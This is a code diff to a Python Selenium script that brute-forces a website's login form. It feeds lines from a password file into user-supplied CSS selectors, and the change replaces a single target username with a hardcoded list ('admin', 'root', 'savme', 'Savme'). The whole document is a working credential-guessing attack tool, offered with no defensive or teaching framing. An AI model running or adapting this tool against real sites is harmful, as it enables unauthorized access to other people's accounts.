@@ -33,7 +33,7 @@ now = datetime.datetime.now()
 
 
 #Args
-parser.add_option("-u", "--username", dest="username",help="Choose the username")
+#parser.add_option("-u", "--username", dest="username",help="Choose the username")
 parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
 parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
 parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
@@ -70,11 +70,13 @@ def wizard():
     username_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
     password_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
     login_btn_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
-    username = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
+    #username = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
     pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
-    brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
+    #brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
+    brutes(username_selector ,password_selector,login_btn_selector,pass_list, website)
 
-def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
+#def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
+def brutes(username_selector ,password_selector,login_btn_selector,pass_list, website):
     f = open(pass_list, 'r')
     driver = webdriver.Chrome(CHROME_DVR_DIR)
     optionss = webdriver.ChromeOptions()
@@ -84,21 +86,22 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
     browser = webdriver.Chrome(CHROME_DVR_DIR)
     while True:
         try:
-            for line in f:
-                browser.get(website)
-                t.sleep(2)
-                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
-                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
-                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
-                # browser.find_element_by_css_selector(password_selector).clear()
-                # browser.find_element_by_css_selector(username_selector).clear()
-                Sel_user.send_keys(username)
-                Sel_pas.send_keys(line)
-                t.sleep(5)
-                print '------------------------'
-                print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
-                print '------------------------'
-                temp = line 
+            for username in ['admin', 'root', 'savme', 'Savme']:
+                for line in f:
+                    browser.get(website)
+                    t.sleep(2)
+                    Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
+                    Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
+                    enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
+                    # browser.find_element_by_css_selector(password_selector).clear()
+                    # browser.find_element_by_css_selector(username_selector).clear()
+                    Sel_user.send_keys(username)
+                    Sel_pas.send_keys(line)
+                    t.sleep(5)
+                    print '------------------------'
+                    print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
+                    print '------------------------'
+                    temp = username + ' ' + line 
         except KeyboardInterrupt: #returns to main menu if ctrl C is used
             exit()
         except selenium.common.exceptions.NoSuchElementException:
@@ -127,20 +130,21 @@ optionss.add_argument("--disable-popup-blocking")
 optionss.add_argument("--disable-extensions")
 count = 1 #count
 
-if options.username == None:
-    if options.usernamesel == None:
-        if options.passsel == None:
-            if options.loginsel == None:
-                if options.passlist == None:
-                    if options.website == None:
-                        wizard()
+#if options.username == None:
+if options.usernamesel == None:
+    if options.passsel == None:
+        if options.loginsel == None:
+            if options.passlist == None:
+                if options.website == None:
+                    wizard()
 
 
-username = options.username
+#username = options.username
 username_selector = options.usernamesel
 password_selector = options.passsel
 login_btn_selector = options.loginsel
 website = options.website
 pass_list = options.passlist
 print banner
-brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
+#brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
+brutes(username_selector ,password_selector,login_btn_selector,pass_list, website)
